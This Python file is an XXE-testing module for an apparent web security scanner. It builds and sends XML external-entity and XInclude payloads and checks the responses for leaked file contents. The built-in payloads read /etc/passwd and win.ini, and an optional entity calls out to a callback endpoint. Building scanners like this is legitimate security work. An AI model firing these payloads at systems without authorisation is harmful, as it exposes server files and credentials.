import argparse
from dataclasses import replace
import re
from uuid import uuid4

from core.headers import parse_headers, without_headers
from core.models import RequestBody
from core.payloadchecks import Interactions, compare_response, file_signatures, payloads_from, validate_markers
from core.probes import input_variants
from core.tooltags import BurpTool
from modules.base import BaseModule


_ROOT = re.compile(r'<([A-Za-z_][\w:.-]*)(?=[\s/>])')
_LEAF = re.compile(r'<(?P<tag>[A-Za-z_][\w:.-]*)(?:\s+[^<>]*?)?>(?P<text>[^<>]*)</(?P=tag)\s*>')
_EMPTY = re.compile(r'<(?P<tag>[A-Za-z_][\w:.-]*)(?P<attrs>[^<>]*?)/\s*>')


def _xml_layout(request):
    if request.body is None or request.body.kind != 'raw':
        return None
    try:
        text = request.body.value.decode('utf-8-sig') if isinstance(request.body.value, bytes) else request.body.value
    except UnicodeError:
        return None
    prolog_free = re.sub(r'<!--.*?-->|<\?.*?\?>', lambda m: ' ' * len(m[0]), text, flags=re.DOTALL)
    root = _ROOT.search(prolog_free)
    if root is None:
        return None
    slots = [(m.start('text'), m.end('text'), '', '') for m in _LEAF.finditer(prolog_free)]
    slots.extend((m.start(), m.end(), '<' + m['tag'] + m['attrs'] + '>', '</' + m['tag'] + '>') for m in _EMPTY.finditer(prolog_free))
    declaration = re.match(r'\s*<\?xml\b.*?\?>', text, re.DOTALL)
    return text, root[1], sorted(slots), declaration.end() if declaration else 0


def _body_request(request, text):
    # Prepared lengths/digests from the capture cannot describe a changed body.
    names = {'content-length', 'transfer-encoding', 'content-md5', 'digest'}
    headers = without_headers(request.headers, names)
    params = [p for p in request.params if not (p.type == 'header' and p.name.lower() in names)]
    effective = parse_headers(headers)
    for param in params:
        if param.type == 'header':
            effective[param.name] = str(param.value)
    if 'content-type' not in effective:
        headers.append('Content-Type: application/xml; charset=utf-8')
    return replace(request, headers=headers, params=params, body=RequestBody('raw', text.encode('utf-8')))


class Xxe(BaseModule):
    """Payload-based XML external entity and XInclude checks."""

    tool = BurpTool.INTRUDER
    follow_redirects = False
    path_options = {'--xxe-payloads': 'file', '--xxe-interactions': 'file'}

    def __init__(self):
        self._payloads = None
        self._markers = []
        self._interactions = Interactions()

    def option_parser(self):
        parser = argparse.ArgumentParser(add_help=False, allow_abbrev=False)
        parser.add_argument('--xxe-payloads', metavar='FILE', help='Complete XML payload documents, one per line; replaces built-ins')
        parser.add_argument('--xxe-marker', action='append', default=[], metavar='TEXT', help='Expected contents of a controlled file or endpoint (repeatable)')
        parser.add_argument('--xxe-callback', metavar='URL', help='Controlled HTTP(S) external-entity callback endpoint')
        parser.add_argument('--xxe-interactions', metavar='FILE', help='Listener JSONL with exact token fields; checked at finalize')
        return parser

    def setup(self, args):
        opts, _ = self.option_parser().parse_known_args(args)
        self._payloads = payloads_from(opts.xxe_payloads, (), 'xxe') if opts.xxe_payloads else None
        self._markers = opts.xxe_marker
        validate_markers(self._markers)
        self._interactions = Interactions(opts.xxe_callback, opts.xxe_interactions)
        if self._payloads and any('{callback}' in p for p in self._payloads) and not opts.xxe_callback:
            raise ValueError('XXE callback payloads require --xxe-callback')

    async def mutate(self, requests, context):
        def variants():
            for seed, req in enumerate(requests):
                marker = 'xxeprobe' + uuid4().hex
                left, right = marker[:len(marker) // 2], marker[len(marker) // 2:]
                layout = _xml_layout(req)
                count = sum(1 for _ in input_variants(req, ''))
                root = layout[1] if layout else 'xxeprobe'
                specs = []
                if self._payloads is None:
                    for uri in ('file:///etc/passwd', 'file:///C:/Windows/win.ini'):
                        specs.append((f'<!DOCTYPE {root} [<!ENTITY probe SYSTEM "{uri}">]>', '&probe;', None))
                    specs.append((f'<!DOCTYPE {root} [<!ENTITY left "{left}"><!ENTITY right "{right}"><!ENTITY probe "&left;&right;">]>', '&probe;', None))
                    specs.append(('', '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/>', None))
                    if self._interactions.callback:
                        token = uuid4().hex
                        uri = self._interactions.url(token).replace('"', '%22').replace('<', '%3C').replace('>', '%3E')
                        specs.append((f'<!DOCTYPE {root} [<!ENTITY probe SYSTEM "{uri}">]>', '&probe;', token))
                    raw_slots = layout[2] if layout and '<!DOCTYPE' not in layout[0].upper() else []
                    raw_count = len(raw_slots)
                else:
                    for template in self._payloads:
                        token = uuid4().hex if '{callback}' in template else None
                        replacements = {'{callback}': self._interactions.url(token) if token else '',
                                        '{left}': left, '{right}': right, '{marker}': marker}
                        document = re.sub(r'\{(?:callback|left|right|marker)\}', lambda m: replacements[m.group()], template)
                        specs.append((document, None, token))
                    raw_count = 1 if layout else 0
                total = 1 + (count + raw_count) * len(specs)
                if total == 1:
                    continue
                def tagged(variant, baseline, location='', name='', payload=''):
                    return replace(variant, metadata={**variant.metadata, 'xxe': {
                        'seed': seed, 'total': total, 'baseline': baseline, 'location': location,
                        'parameter': name, 'payload': payload, 'marker': marker}})
                yield tagged(req, True)
                for declaration, fragment, token in specs:
                    document = declaration if fragment is None else declaration + f'<{root}>' + fragment + f'</{root}>'
                    rendered = {}
                    def render():
                        current = uuid4().hex if token else None
                        payload = document.replace(token, current) if token else document
                        rendered.update(token=current, payload=payload)
                        return payload
                    for location, name, variant in input_variants(req, render):
                        variant = tagged(variant, False, location, name, rendered['payload'])
                        if token:
                            self._interactions.track(rendered['token'], variant, 'xxe')
                        yield variant
                    if raw_count:
                        if fragment is None:
                            raw_variants = [(document, 'document')]
                        else:
                            text, _, _, insertion = layout
                            raw_variants = ((text[:insertion] + declaration + text[insertion:start] + opening + fragment + closing + text[end:], f'xml-leaf-{i + 1}')
                                            for i, (start, end, opening, closing) in enumerate(raw_slots))
                        for text, name in raw_variants:
                            current = uuid4().hex if token else None
                            text = text.replace(token, current) if token else text
                            variant = tagged(_body_request(req, text), False, 'xml-body', name, text)
                            if token:
                                self._interactions.track(current, variant, 'xxe')
                            yield variant
        return variants()

    async def analyze_one(self, response, context):
        meta = response.request.metadata.get('xxe')
        if meta is None:
            return
        self._interactions.observe(response.request)
        found = file_signatures(response.body, self._markers, decode_base64=True) if response.status else set()
        text = response.body.decode('utf-8', 'replace')
        if response.status and meta['marker'] in text:
            found.add('internal-entity-expansion')
        if not meta['baseline']:
            echo = file_signatures(meta['payload'].encode(), self._markers, decode_base64=True)
            known = {item.removeprefix('base64:') for item in echo}
            found = {item for item in found if item.removeprefix('base64:') not in known}
            if meta['marker'] in meta['payload']:
                found.discard('internal-entity-expansion')
        await compare_response(self, response, context, 'xxe', found)

    async def finalize(self, context):
        self._interactions.report(self, context, 'xxe')
